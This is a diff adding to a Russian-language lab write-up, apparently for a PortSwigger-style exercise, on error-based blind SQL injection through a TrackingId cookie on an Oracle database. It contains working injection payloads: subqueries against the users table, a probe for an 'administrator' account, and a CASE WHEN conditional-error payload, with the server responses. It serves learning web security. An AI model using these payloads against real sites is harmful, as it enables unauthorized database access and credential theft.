@@ -55,3 +55,23 @@ Cookie: TrackingId=zAzb3amQWMFUTIlS' || (SELECT '' FROM users) ||'
 
 Мы получим ошибку, так как нет уточнения, что я хочу получить одну строку юзера (по отдельности), то есть по умолчянию пытаемся взять все данные из таблицы, ччто приводит к ошибке: 
 `single-row subquery returns more than one row`
+
+Следующим логическим шагом будет: Просмотр существует ли пользователь-администратор в системе?
+
+```sql
+Cookie: TrackingId=zAzb3amQWMFUTIlS' || (SELECT '' FROM users WHERE username='administrator') ||'
+```
+
+Результат: 
+`HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 11458`
+
+Но также, если мы сделаем запрос на несуществующего пользователя, то увидим `HTTP/2 200 OK` немного непонятно...
+
+Для более точного определения, что ползователь существует, необходимо использовать оператор `CASE` поведение похоже на `if/then/else`
+
+```sql
+Cookie: TrackingId=k2xQHAMjyOoJ8Iz4' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||'
+```
